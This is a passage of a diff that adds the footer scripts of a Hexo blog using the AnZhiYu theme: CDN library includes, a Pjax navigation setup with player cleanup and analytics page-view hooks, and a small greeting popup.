+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
